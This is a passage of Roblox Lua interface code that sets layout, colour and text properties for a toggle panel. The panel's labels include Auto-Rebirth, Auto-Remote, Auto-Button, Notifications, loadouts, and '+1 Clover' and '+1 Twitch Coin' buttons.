Deco_9.TextXAlignment = Enum.TextXAlignment.Left

Deco_10.Name = "Deco"
Deco_10.Parent = AutoRebirthOn
Deco_10.AnchorPoint = Vector2.new(1, 0)
Deco_10.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_10.BackgroundTransparency = 1
Deco_10.Position = UDim2.new(1, 0, 0, 0)
Deco_10.Size = UDim2.new(1, 0, 1, 0)
Deco_10.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_10.ZIndex = 5
Deco_10.Image = "rbxassetid://1042585012"
Deco_10.ImageTransparency = 0.5

AutoRebirthOff.Name = "AutoRebirthOff"
AutoRebirthOff.Parent = AutoRebirthToggle
AutoRebirthOff.AnchorPoint = Vector2.new(1, 0)
AutoRebirthOff.BackgroundColor3 = Color3.new(0.796079, 0, 0.0156863)
AutoRebirthOff.BorderSizePixel = 0
AutoRebirthOff.Position = UDim2.new(1, 0, 0, 0)
AutoRebirthOff.Size = UDim2.new(0.400000006, 0, 1, 0)
AutoRebirthOff.ZIndex = 5

Deco_11.Name = "Deco"
Deco_11.Parent = AutoRebirthOff
Deco_11.AnchorPoint = Vector2.new(0, 0.5)
Deco_11.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_11.BackgroundTransparency = 1
Deco_11.Position = UDim2.new(0, 0, 0.5, 0)
Deco_11.Size = UDim2.new(1, 0, 1, 0)
Deco_11.ZIndex = 5
Deco_11.Font = Enum.Font.ArialBold
Deco_11.Text = "OFF"
Deco_11.TextScaled = true
Deco_11.TextSize = 14
Deco_11.TextWrapped = true
Deco_11.TextXAlignment = Enum.TextXAlignment.Right

Deco_12.Name = "Deco"
Deco_12.Parent = AutoRebirthOff
Deco_12.AnchorPoint = Vector2.new(1, 0)
Deco_12.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_12.BackgroundTransparency = 1
Deco_12.Position = UDim2.new(1, 0, 0, 0)
Deco_12.Size = UDim2.new(1, 0, 1, 0)
Deco_12.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_12.ZIndex = 5
Deco_12.Image = "rbxassetid://1042585012"
Deco_12.ImageTransparency = 0.5

Deco_13.Name = "Deco"
Deco_13.Parent = AutoRebirthContents
Deco_13.AnchorPoint = Vector2.new(0, 0.5)
Deco_13.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_13.BackgroundTransparency = 1
Deco_13.Position = UDim2.new(0, 0, 0.5, 0)
Deco_13.Size = UDim2.new(0.5, 0, 0.699999988, 0)
Deco_13.ZIndex = 5
Deco_13.Font = Enum.Font.ArialBold
Deco_13.Text = "Auto-Rebirth:"
Deco_13.TextScaled = true
Deco_13.TextSize = 14
Deco_13.TextWrapped = true
Deco_13.TextXAlignment = Enum.TextXAlignment.Left

Deco_14.Name = "Deco"
Deco_14.Parent = AutoRebirth
Deco_14.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_14.BackgroundTransparency = 1
Deco_14.Position = UDim2.new(0, 0, 1, -20)
Deco_14.Size = UDim2.new(1, 0, 0, 20)
Deco_14.ZIndex = 5
Deco_14.Font = Enum.Font.Arial
Deco_14.Text = "Rebirths as soon as you can."
Deco_14.TextColor3 = Color3.new(0, 0, 0)
Deco_14.TextScaled = true
Deco_14.TextSize = 14
Deco_14.TextTransparency = 0.69999998807907
Deco_14.TextWrapped = true

AutoRemote.Name = "AutoRemote"
AutoRemote.Parent = Contents
AutoRemote.BackgroundColor3 = Color3.new(1, 1, 1)
AutoRemote.BackgroundTransparency = 1
AutoRemote.LayoutOrder = 2
AutoRemote.Size = UDim2.new(1, -20, 0, 60)
AutoRemote.ZIndex = 5
AutoRemote.Image = "rbxassetid://875052259"
AutoRemote.ImageColor3 = Color3.new(0.47451, 0.639216, 0.258824)
AutoRemote.ScaleType = Enum.ScaleType.Slice
AutoRemote.SliceCenter = Rect.new(10, 10, 10, 10)

AutoRemoteContents.Name = "AutoRemoteContents"
AutoRemoteContents.Parent = AutoRemote
AutoRemoteContents.BackgroundColor3 = Color3.new(1, 1, 1)
AutoRemoteContents.BackgroundTransparency = 1
AutoRemoteContents.BorderSizePixel = 0
AutoRemoteContents.Size = UDim2.new(1, 0, 0, 40)
AutoRemoteContents.ZIndex = 5

AutoRemoteToggle.Name = "AutoRemoteToggle"
AutoRemoteToggle.Parent = AutoRemoteContents
AutoRemoteToggle.AnchorPoint = Vector2.new(0, 0.5)
AutoRemoteToggle.BackgroundColor3 = Color3.new(0.741176, 0.741176, 0.741176)
AutoRemoteToggle.BorderSizePixel = 0
AutoRemoteToggle.Position = UDim2.new(0.550000012, 0, 0.5, 0)
AutoRemoteToggle.Size = UDim2.new(0.400000006, 0, 0, 30)
AutoRemoteToggle.ZIndex = 5
AutoRemoteToggle.Font = Enum.Font.ArialBold
AutoRemoteToggle.Text = ""
AutoRemoteToggle.TextScaled = true
AutoRemoteToggle.TextSize = 40
AutoRemoteToggle.TextWrapped = true

AutoRemoteOn.Name = "AutoRemoteOn"
AutoRemoteOn.Parent = AutoRemoteToggle
AutoRemoteOn.BackgroundColor3 = Color3.new(0, 0.796079, 0)
AutoRemoteOn.BorderSizePixel = 0
AutoRemoteOn.Size = UDim2.new(0.400000006, 0, 1, 0)
AutoRemoteOn.Visible = false
AutoRemoteOn.ZIndex = 5

Title.Name = "Title"
Title.Parent = AutoRemoteOn
Title.AnchorPoint = Vector2.new(0, 0.5)
Title.BackgroundColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 0, 0.5, 0)
Title.Size = UDim2.new(1, 0, 1, 0)
Title.ZIndex = 5
Title.Font = Enum.Font.ArialBold
Title.Text = "ON"
Title.TextScaled = true
Title.TextSize = 14
Title.TextWrapped = true
Title.TextXAlignment = Enum.TextXAlignment.Left

Fold_3.Name = "Fold"
Fold_3.Parent = AutoRemoteOn
Fold_3.AnchorPoint = Vector2.new(1, 0)
Fold_3.BackgroundColor3 = Color3.new(1, 1, 1)
Fold_3.BackgroundTransparency = 1
Fold_3.Position = UDim2.new(1, 0, 0, 0)
Fold_3.Size = UDim2.new(1, 0, 1, 0)
Fold_3.SizeConstraint = Enum.SizeConstraint.RelativeYY
Fold_3.ZIndex = 5
Fold_3.Image = "rbxassetid://1042585012"
Fold_3.ImageTransparency = 0.5

AutoRemoteOff.Name = "AutoRemoteOff"
AutoRemoteOff.Parent = AutoRemoteToggle
AutoRemoteOff.AnchorPoint = Vector2.new(1, 0)
AutoRemoteOff.BackgroundColor3 = Color3.new(0.796079, 0, 0.0156863)
AutoRemoteOff.BorderSizePixel = 0
AutoRemoteOff.Position = UDim2.new(1, 0, 0, 0)
AutoRemoteOff.Size = UDim2.new(0.400000006, 0, 1, 0)
AutoRemoteOff.ZIndex = 5

Title_2.Name = "Title"
Title_2.Parent = AutoRemoteOff
Title_2.AnchorPoint = Vector2.new(0, 0.5)
Title_2.BackgroundColor3 = Color3.new(1, 1, 1)
Title_2.BackgroundTransparency = 1
Title_2.Position = UDim2.new(0, 0, 0.5, 0)
Title_2.Size = UDim2.new(1, 0, 1, 0)
Title_2.ZIndex = 5
Title_2.Font = Enum.Font.ArialBold
Title_2.Text = "OFF"
Title_2.TextScaled = true
Title_2.TextSize = 14
Title_2.TextWrapped = true
Title_2.TextXAlignment = Enum.TextXAlignment.Right

Fold_4.Name = "Fold"
Fold_4.Parent = AutoRemoteOff
Fold_4.AnchorPoint = Vector2.new(1, 0)
Fold_4.BackgroundColor3 = Color3.new(1, 1, 1)
Fold_4.BackgroundTransparency = 1
Fold_4.Position = UDim2.new(1, 0, 0, 0)
Fold_4.Size = UDim2.new(1, 0, 1, 0)
Fold_4.SizeConstraint = Enum.SizeConstraint.RelativeYY
Fold_4.ZIndex = 5
Fold_4.Image = "rbxassetid://1042585012"
Fold_4.ImageTransparency = 0.5

Deco_15.Name = "Deco"
Deco_15.Parent = AutoRemoteContents
Deco_15.AnchorPoint = Vector2.new(0, 0.5)
Deco_15.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_15.BackgroundTransparency = 1
Deco_15.Position = UDim2.new(0, 0, 0.5, 0)
Deco_15.Size = UDim2.new(0.5, 0, 0.699999988, 0)
Deco_15.ZIndex = 5
Deco_15.Font = Enum.Font.ArialBold
Deco_15.Text = "Auto-Remote:"
Deco_15.TextScaled = true
Deco_15.TextSize = 14
Deco_15.TextWrapped = true
Deco_15.TextXAlignment = Enum.TextXAlignment.Left

Deco_16.Name = "Deco"
Deco_16.Parent = AutoRemote
Deco_16.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_16.BackgroundTransparency = 1
Deco_16.Position = UDim2.new(0, 0, 1, -20)
Deco_16.Size = UDim2.new(1, 0, 0, 20)
Deco_16.ZIndex = 5
Deco_16.Font = Enum.Font.Arial
Deco_16.Text = "Automatically presses the remote for you."
Deco_16.TextColor3 = Color3.new(0, 0, 0)
Deco_16.TextScaled = true
Deco_16.TextSize = 14
Deco_16.TextTransparency = 0.69999998807907
Deco_16.TextWrapped = true

CloversTwitchCoins.Name = "CloversTwitchCoins"
CloversTwitchCoins.Parent = Contents
CloversTwitchCoins.BackgroundColor3 = Color3.new(1, 1, 1)
CloversTwitchCoins.BackgroundTransparency = 1
CloversTwitchCoins.LayoutOrder = 6
CloversTwitchCoins.Size = UDim2.new(1, -20, 0, 40)
CloversTwitchCoins.ZIndex = 5
CloversTwitchCoins.Image = "rbxassetid://875052259"
CloversTwitchCoins.ImageColor3 = Color3.new(0.227451, 0.227451, 0.227451)
CloversTwitchCoins.ScaleType = Enum.ScaleType.Slice
CloversTwitchCoins.SliceCenter = Rect.new(10, 10, 10, 10)

CloversTwitchCoinsContents.Name = "CloversTwitchCoinsContents"
CloversTwitchCoinsContents.Parent = CloversTwitchCoins
CloversTwitchCoinsContents.BackgroundColor3 = Color3.new(1, 1, 1)
CloversTwitchCoinsContents.BackgroundTransparency = 1
CloversTwitchCoinsContents.BorderSizePixel = 0
CloversTwitchCoinsContents.Size = UDim2.new(1, 0, 0, 40)
CloversTwitchCoinsContents.ZIndex = 5

AddCloverButton.Name = "AddCloverButton"
AddCloverButton.Parent = CloversTwitchCoinsContents
AddCloverButton.AnchorPoint = Vector2.new(0, 0.5)
AddCloverButton.BackgroundColor3 = Color3.new(0.286275, 0.839216, 0.247059)
AddCloverButton.BorderSizePixel = 0
AddCloverButton.Position = UDim2.new(0.0500000007, 0, 0.5, 0)
AddCloverButton.Size = UDim2.new(0.400000006, 0, 0, 30)
AddCloverButton.ZIndex = 5
AddCloverButton.Font = Enum.Font.ArialBold
AddCloverButton.Text = "+1 Clover"
AddCloverButton.TextScaled = true
AddCloverButton.TextSize = 40
AddCloverButton.TextWrapped = true

Deco_17.Name = "Deco"
Deco_17.Parent = AddCloverButton
Deco_17.AnchorPoint = Vector2.new(1, 0)
Deco_17.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_17.BackgroundTransparency = 1
Deco_17.Position = UDim2.new(1, 0, 0, 0)
Deco_17.Size = UDim2.new(1, 0, 1, 0)
Deco_17.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_17.ZIndex = 5
Deco_17.Image = "rbxassetid://1042585012"
Deco_17.ImageTransparency = 0.30000001192093

AddTwitchCoinButton.Name = "AddTwitchCoinButton"
AddTwitchCoinButton.Parent = CloversTwitchCoinsContents
AddTwitchCoinButton.AnchorPoint = Vector2.new(0, 0.5)
AddTwitchCoinButton.BackgroundColor3 = Color3.new(0.741176, 0.290196, 1)
AddTwitchCoinButton.BorderSizePixel = 0
AddTwitchCoinButton.Position = UDim2.new(0.449999988, 0, 0.5, 0)
AddTwitchCoinButton.Size = UDim2.new(0.400000006, 0, 0, 30)
AddTwitchCoinButton.ZIndex = 5
AddTwitchCoinButton.Font = Enum.Font.ArialBold
AddTwitchCoinButton.Text = "+1 Twitch Coin"
AddTwitchCoinButton.TextScaled = true
AddTwitchCoinButton.TextSize = 40
AddTwitchCoinButton.TextWrapped = true

Deco_18.Name = "Deco"
Deco_18.Parent = AddTwitchCoinButton
Deco_18.AnchorPoint = Vector2.new(1, 0)
Deco_18.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_18.BackgroundTransparency = 1
Deco_18.Position = UDim2.new(1, 0, 0, 0)
Deco_18.Size = UDim2.new(1, 0, 1, 0)
Deco_18.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_18.ZIndex = 5
Deco_18.Image = "rbxassetid://1042585012"
Deco_18.ImageTransparency = 0.30000001192093

UIListLayout_4.Parent = CloversTwitchCoinsContents
UIListLayout_4.FillDirection = Enum.FillDirection.Horizontal
UIListLayout_4.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout_4.VerticalAlignment = Enum.VerticalAlignment.Center

Notifications.Name = "Notifications"
Notifications.Parent = Contents
Notifications.BackgroundColor3 = Color3.new(1, 1, 1)
Notifications.BackgroundTransparency = 1
Notifications.LayoutOrder = 4
Notifications.Size = UDim2.new(1, -20, 0, 60)
Notifications.ZIndex = 5
Notifications.Image = "rbxassetid://875052259"
Notifications.ImageColor3 = Color3.new(0.231373, 0.509804, 0.639216)
Notifications.ScaleType = Enum.ScaleType.Slice
Notifications.SliceCenter = Rect.new(10, 10, 10, 10)

NotificationsContents.Name = "NotificationsContents"
NotificationsContents.Parent = Notifications
NotificationsContents.BackgroundColor3 = Color3.new(1, 1, 1)
NotificationsContents.BackgroundTransparency = 1
NotificationsContents.BorderSizePixel = 0
NotificationsContents.Size = UDim2.new(1, 0, 0, 40)
NotificationsContents.ZIndex = 5

NotificationsToggle.Name = "NotificationsToggle"
NotificationsToggle.Parent = NotificationsContents
NotificationsToggle.AnchorPoint = Vector2.new(0, 0.5)
NotificationsToggle.BackgroundColor3 = Color3.new(0.741176, 0.741176, 0.741176)
NotificationsToggle.BorderSizePixel = 0
NotificationsToggle.Position = UDim2.new(0.550000012, 0, 0.5, 0)
NotificationsToggle.Size = UDim2.new(0.400000006, 0, 0, 30)
NotificationsToggle.ZIndex = 5
NotificationsToggle.Font = Enum.Font.ArialBold
NotificationsToggle.Text = ""
NotificationsToggle.TextScaled = true
NotificationsToggle.TextSize = 40
NotificationsToggle.TextWrapped = true

NotificationsOn.Name = "NotificationsOn"
NotificationsOn.Parent = NotificationsToggle
NotificationsOn.BackgroundColor3 = Color3.new(0, 0.796079, 0)
NotificationsOn.BorderSizePixel = 0
NotificationsOn.Size = UDim2.new(0.400000006, 0, 1, 0)
NotificationsOn.ZIndex = 5

Deco_19.Name = "Deco"
Deco_19.Parent = NotificationsOn
Deco_19.AnchorPoint = Vector2.new(0, 0.5)
Deco_19.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_19.BackgroundTransparency = 1
Deco_19.Position = UDim2.new(0, 0, 0.5, 0)
Deco_19.Size = UDim2.new(1, 0, 1, 0)
Deco_19.ZIndex = 5
Deco_19.Font = Enum.Font.ArialBold
Deco_19.Text = "ON"
Deco_19.TextScaled = true
Deco_19.TextSize = 14
Deco_19.TextWrapped = true
Deco_19.TextXAlignment = Enum.TextXAlignment.Left

Deco_20.Name = "Deco"
Deco_20.Parent = NotificationsOn
Deco_20.AnchorPoint = Vector2.new(1, 0)
Deco_20.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_20.BackgroundTransparency = 1
Deco_20.Position = UDim2.new(1, 0, 0, 0)
Deco_20.Size = UDim2.new(1, 0, 1, 0)
Deco_20.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_20.ZIndex = 5
Deco_20.Image = "rbxassetid://1042585012"
Deco_20.ImageTransparency = 0.5

NotificationsOff.Name = "NotificationsOff"
NotificationsOff.Parent = NotificationsToggle
NotificationsOff.AnchorPoint = Vector2.new(1, 0)
NotificationsOff.BackgroundColor3 = Color3.new(0.796079, 0, 0.0156863)
NotificationsOff.BorderSizePixel = 0
NotificationsOff.Position = UDim2.new(1, 0, 0, 0)
NotificationsOff.Size = UDim2.new(0.400000006, 0, 1, 0)
NotificationsOff.Visible = false
NotificationsOff.ZIndex = 5

Deco_21.Name = "Deco"
Deco_21.Parent = NotificationsOff
Deco_21.AnchorPoint = Vector2.new(0, 0.5)
Deco_21.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_21.BackgroundTransparency = 1
Deco_21.Position = UDim2.new(0, 0, 0.5, 0)
Deco_21.Size = UDim2.new(1, 0, 1, 0)
Deco_21.ZIndex = 5
Deco_21.Font = Enum.Font.ArialBold
Deco_21.Text = "OFF"
Deco_21.TextScaled = true
Deco_21.TextSize = 14
Deco_21.TextWrapped = true
Deco_21.TextXAlignment = Enum.TextXAlignment.Right

Deco_22.Name = "Deco"
Deco_22.Parent = NotificationsOff
Deco_22.AnchorPoint = Vector2.new(1, 0)
Deco_22.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_22.BackgroundTransparency = 1
Deco_22.Position = UDim2.new(1, 0, 0, 0)
Deco_22.Size = UDim2.new(1, 0, 1, 0)
Deco_22.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_22.ZIndex = 5
Deco_22.Image = "rbxassetid://1042585012"
Deco_22.ImageTransparency = 0.5

Deco_23.Name = "Deco"
Deco_23.Parent = NotificationsContents
Deco_23.AnchorPoint = Vector2.new(0, 0.5)
Deco_23.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_23.BackgroundTransparency = 1
Deco_23.Position = UDim2.new(0, 0, 0.5, 0)
Deco_23.Size = UDim2.new(0.5, 0, 0.699999988, 0)
Deco_23.ZIndex = 5
Deco_23.Font = Enum.Font.ArialBold
Deco_23.Text = "Notifications:"
Deco_23.TextScaled = true
Deco_23.TextSize = 14
Deco_23.TextWrapped = true
Deco_23.TextXAlignment = Enum.TextXAlignment.Left

Deco_24.Name = "Deco"
Deco_24.Parent = Notifications
Deco_24.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_24.BackgroundTransparency = 1
Deco_24.Position = UDim2.new(0, 0, 1, -20)
Deco_24.Size = UDim2.new(1, 0, 0, 20)
Deco_24.ZIndex = 5
Deco_24.Font = Enum.Font.Arial
Deco_24.Text = "Toggles collision notifications, etc."
Deco_24.TextColor3 = Color3.new(0, 0, 0)
Deco_24.TextScaled = true
Deco_24.TextSize = 14
Deco_24.TextTransparency = 0.69999998807907
Deco_24.TextWrapped = true

AutoButton.Name = "AutoButton"
AutoButton.Parent = Contents
AutoButton.BackgroundColor3 = Color3.new(1, 1, 1)
AutoButton.BackgroundTransparency = 1
AutoButton.LayoutOrder = 3
AutoButton.Size = UDim2.new(1, -20, 0, 60)
AutoButton.ZIndex = 5
AutoButton.Image = "rbxassetid://875052259"
AutoButton.ImageColor3 = Color3.new(0.243137, 0.639216, 0.403922)
AutoButton.ScaleType = Enum.ScaleType.Slice
AutoButton.SliceCenter = Rect.new(10, 10, 10, 10)

AutoButtonContents.Name = "AutoButtonContents"
AutoButtonContents.Parent = AutoButton
AutoButtonContents.BackgroundColor3 = Color3.new(1, 1, 1)
AutoButtonContents.BackgroundTransparency = 1
AutoButtonContents.BorderSizePixel = 0
AutoButtonContents.Size = UDim2.new(1, 0, 0, 40)
AutoButtonContents.ZIndex = 5

AutoButtonToggle.Name = "AutoButtonToggle"
AutoButtonToggle.Parent = AutoButtonContents
AutoButtonToggle.AnchorPoint = Vector2.new(0, 0.5)
AutoButtonToggle.BackgroundColor3 = Color3.new(0.741176, 0.741176, 0.741176)
AutoButtonToggle.BorderSizePixel = 0
AutoButtonToggle.Position = UDim2.new(0.550000012, 0, 0.5, 0)
AutoButtonToggle.Size = UDim2.new(0.400000006, 0, 0, 30)
AutoButtonToggle.ZIndex = 5
AutoButtonToggle.Font = Enum.Font.ArialBold
AutoButtonToggle.Text = ""
AutoButtonToggle.TextScaled = true
AutoButtonToggle.TextSize = 40
AutoButtonToggle.TextWrapped = true

AutoButtonOn.Name = "AutoButtonOn"
AutoButtonOn.Parent = AutoButtonToggle
AutoButtonOn.BackgroundColor3 = Color3.new(0, 0.796079, 0)
AutoButtonOn.BorderSizePixel = 0
AutoButtonOn.Size = UDim2.new(0.400000006, 0, 1, 0)
AutoButtonOn.Visible = false
AutoButtonOn.ZIndex = 5

Title_3.Name = "Title"
Title_3.Parent = AutoButtonOn
Title_3.AnchorPoint = Vector2.new(0, 0.5)
Title_3.BackgroundColor3 = Color3.new(1, 1, 1)
Title_3.BackgroundTransparency = 1
Title_3.Position = UDim2.new(0, 0, 0.5, 0)
Title_3.Size = UDim2.new(1, 0, 1, 0)
Title_3.ZIndex = 5
Title_3.Font = Enum.Font.ArialBold
Title_3.Text = "ON"
Title_3.TextScaled = true
Title_3.TextSize = 14
Title_3.TextWrapped = true
Title_3.TextXAlignment = Enum.TextXAlignment.Left

Fold_5.Name = "Fold"
Fold_5.Parent = AutoButtonOn
Fold_5.AnchorPoint = Vector2.new(1, 0)
Fold_5.BackgroundColor3 = Color3.new(1, 1, 1)
Fold_5.BackgroundTransparency = 1
Fold_5.Position = UDim2.new(1, 0, 0, 0)
Fold_5.Size = UDim2.new(1, 0, 1, 0)
Fold_5.SizeConstraint = Enum.SizeConstraint.RelativeYY
Fold_5.ZIndex = 5
Fold_5.Image = "rbxassetid://1042585012"
Fold_5.ImageTransparency = 0.5

AutoButtonOff.Name = "AutoButtonOff"
AutoButtonOff.Parent = AutoButtonToggle
AutoButtonOff.AnchorPoint = Vector2.new(1, 0)
AutoButtonOff.BackgroundColor3 = Color3.new(0.796079, 0, 0.0156863)
AutoButtonOff.BorderSizePixel = 0
AutoButtonOff.Position = UDim2.new(1, 0, 0, 0)
AutoButtonOff.Size = UDim2.new(0.400000006, 0, 1, 0)
AutoButtonOff.ZIndex = 5

Title_4.Name = "Title"
Title_4.Parent = AutoButtonOff
Title_4.AnchorPoint = Vector2.new(0, 0.5)
Title_4.BackgroundColor3 = Color3.new(1, 1, 1)
Title_4.BackgroundTransparency = 1
Title_4.Position = UDim2.new(0, 0, 0.5, 0)
Title_4.Size = UDim2.new(1, 0, 1, 0)
Title_4.ZIndex = 5
Title_4.Font = Enum.Font.ArialBold
Title_4.Text = "OFF"
Title_4.TextScaled = true
Title_4.TextSize = 14
Title_4.TextWrapped = true
Title_4.TextXAlignment = Enum.TextXAlignment.Right

Fold_6.Name = "Fold"
Fold_6.Parent = AutoButtonOff
Fold_6.AnchorPoint = Vector2.new(1, 0)
Fold_6.BackgroundColor3 = Color3.new(1, 1, 1)
Fold_6.BackgroundTransparency = 1
Fold_6.Position = UDim2.new(1, 0, 0, 0)
Fold_6.Size = UDim2.new(1, 0, 1, 0)
Fold_6.SizeConstraint = Enum.SizeConstraint.RelativeYY
Fold_6.ZIndex = 5
Fold_6.Image = "rbxassetid://1042585012"
Fold_6.ImageTransparency = 0.5

Deco_25.Name = "Deco"
Deco_25.Parent = AutoButtonContents
Deco_25.AnchorPoint = Vector2.new(0, 0.5)
Deco_25.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_25.BackgroundTransparency = 1
Deco_25.Position = UDim2.new(0, 0, 0.5, 0)
Deco_25.Size = UDim2.new(0.5, 0, 0.699999988, 0)
Deco_25.ZIndex = 5
Deco_25.Font = Enum.Font.ArialBold
Deco_25.Text = "Auto-Button:"
Deco_25.TextScaled = true
Deco_25.TextSize = 14
Deco_25.TextWrapped = true
Deco_25.TextXAlignment = Enum.TextXAlignment.Left

Deco_26.Name = "Deco"
Deco_26.Parent = AutoButton
Deco_26.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_26.BackgroundTransparency = 1
Deco_26.Position = UDim2.new(0, 0, 1, -20)
Deco_26.Size = UDim2.new(1, 0, 0, 20)
Deco_26.ZIndex = 5
Deco_26.Font = Enum.Font.Arial
Deco_26.Text = "Automatically presses buttons for you."
Deco_26.TextColor3 = Color3.new(0, 0, 0)
Deco_26.TextScaled = true
Deco_26.TextSize = 14
Deco_26.TextTransparency = 0.69999998807907
Deco_26.TextWrapped = true

AutoLoadout.Name = "AutoLoadout"
AutoLoadout.Parent = Contents
AutoLoadout.BackgroundColor3 = Color3.new(1, 1, 1)
AutoLoadout.BackgroundTransparency = 1
AutoLoadout.LayoutOrder = 5
AutoLoadout.Size = UDim2.new(1, -20, 0, 140)
AutoLoadout.ZIndex = 5
AutoLoadout.Image = "rbxassetid://875052259"
AutoLoadout.ImageColor3 = Color3.new(0.376471, 0.309804, 0.639216)
AutoLoadout.ScaleType = Enum.ScaleType.Slice
AutoLoadout.SliceCenter = Rect.new(10, 10, 10, 10)

AutoLoadoutContents.Name = "AutoLoadoutContents"
AutoLoadoutContents.Parent = AutoLoadout
AutoLoadoutContents.BackgroundColor3 = Color3.new(1, 1, 1)
AutoLoadoutContents.BackgroundTransparency = 1
AutoLoadoutContents.BorderSizePixel = 0
AutoLoadoutContents.Size = UDim2.new(1, 0, 0, 40)
AutoLoadoutContents.ZIndex = 5

AutoLoadout1Toggle.Name = "AutoLoadout1Toggle"
AutoLoadout1Toggle.Parent = AutoLoadoutContents
AutoLoadout1Toggle.AnchorPoint = Vector2.new(0, 0.5)
AutoLoadout1Toggle.BackgroundColor3 = Color3.new(0.741176, 0.741176, 0.741176)
AutoLoadout1Toggle.BorderSizePixel = 0
AutoLoadout1Toggle.Position = UDim2.new(0.550000012, 0, 0.5, 0)
AutoLoadout1Toggle.Size = UDim2.new(0.400000006, 0, 0, 30)
AutoLoadout1Toggle.ZIndex = 5
AutoLoadout1Toggle.Font = Enum.Font.ArialBold
AutoLoadout1Toggle.Text = ""
AutoLoadout1Toggle.TextScaled = true
AutoLoadout1Toggle.TextSize = 40
AutoLoadout1Toggle.TextWrapped = true

AutoLoadout1On.Name = "AutoLoadout1On"
AutoLoadout1On.Parent = AutoLoadout1Toggle
AutoLoadout1On.BackgroundColor3 = Color3.new(0, 0.796079, 0)
AutoLoadout1On.BorderSizePixel = 0
AutoLoadout1On.Size = UDim2.new(0.400000006, 0, 1, 0)
AutoLoadout1On.Visible = false
AutoLoadout1On.ZIndex = 5

Deco_27.Name = "Deco"
Deco_27.Parent = AutoLoadout1On
Deco_27.AnchorPoint = Vector2.new(0, 0.5)
Deco_27.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_27.BackgroundTransparency = 1
Deco_27.Position = UDim2.new(0, 0, 0.5, 0)
Deco_27.Size = UDim2.new(1, 0, 1, 0)
Deco_27.ZIndex = 5
Deco_27.Font = Enum.Font.ArialBold
Deco_27.Text = "ON"
Deco_27.TextScaled = true
Deco_27.TextSize = 14
Deco_27.TextWrapped = true
Deco_27.TextXAlignment = Enum.TextXAlignment.Left

Deco_28.Name = "Deco"
Deco_28.Parent = AutoLoadout1On
Deco_28.AnchorPoint = Vector2.new(1, 0)
Deco_28.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_28.BackgroundTransparency = 1
Deco_28.Position = UDim2.new(1, 0, 0, 0)
Deco_28.Size = UDim2.new(1, 0, 1, 0)
Deco_28.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_28.ZIndex = 5
Deco_28.Image = "rbxassetid://1042585012"
Deco_28.ImageTransparency = 0.5

AutoLoadout1Off.Name = "AutoLoadout1Off"
AutoLoadout1Off.Parent = AutoLoadout1Toggle
AutoLoadout1Off.AnchorPoint = Vector2.new(1, 0)
AutoLoadout1Off.BackgroundColor3 = Color3.new(0.796079, 0, 0.0156863)
AutoLoadout1Off.BorderSizePixel = 0
AutoLoadout1Off.Position = UDim2.new(1, 0, 0, 0)
AutoLoadout1Off.Size = UDim2.new(0.400000006, 0, 1, 0)
AutoLoadout1Off.ZIndex = 5

Deco_29.Name = "Deco"
Deco_29.Parent = AutoLoadout1Off
Deco_29.AnchorPoint = Vector2.new(0, 0.5)
Deco_29.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_29.BackgroundTransparency = 1
Deco_29.Position = UDim2.new(0, 0, 0.5, 0)
Deco_29.Size = UDim2.new(1, 0, 1, 0)
Deco_29.ZIndex = 5
Deco_29.Font = Enum.Font.ArialBold
Deco_29.Text = "OFF"
Deco_29.TextScaled = true
Deco_29.TextSize = 14
Deco_29.TextWrapped = true
Deco_29.TextXAlignment = Enum.TextXAlignment.Right

Deco_30.Name = "Deco"
Deco_30.Parent = AutoLoadout1Off
Deco_30.AnchorPoint = Vector2.new(1, 0)
Deco_30.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_30.BackgroundTransparency = 1
Deco_30.Position = UDim2.new(1, 0, 0, 0)
Deco_30.Size = UDim2.new(1, 0, 1, 0)
Deco_30.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_30.ZIndex = 5
Deco_30.Image = "rbxassetid://1042585012"
Deco_30.ImageTransparency = 0.5

Deco_31.Name = "Deco"
Deco_31.Parent = AutoLoadoutContents
Deco_31.AnchorPoint = Vector2.new(0, 0.5)
Deco_31.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_31.BackgroundTransparency = 1
Deco_31.Position = UDim2.new(0, 0, 0.5, 0)
Deco_31.Size = UDim2.new(0.5, 0, 0.699999988, 0)
Deco_31.ZIndex = 5
Deco_31.Font = Enum.Font.ArialBold
Deco_31.Text = "Loadout 1:"
Deco_31.TextScaled = true
Deco_31.TextSize = 14
Deco_31.TextWrapped = true
Deco_31.TextXAlignment = Enum.TextXAlignment.Left

Deco_32.Name = "Deco"
Deco_32.Parent = AutoLoadoutContents
Deco_32.AnchorPoint = Vector2.new(0, 0.5)
Deco_32.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_32.BackgroundTransparency = 1
Deco_32.Position = UDim2.new(0, 0, 1.5, 0)
Deco_32.Size = UDim2.new(0.5, 0, 0.699999988, 0)
Deco_32.ZIndex = 5
Deco_32.Font = Enum.Font.ArialBold
Deco_32.Text = "Loadout 2:"
Deco_32.TextScaled = true
Deco_32.TextSize = 14
Deco_32.TextWrapped = true
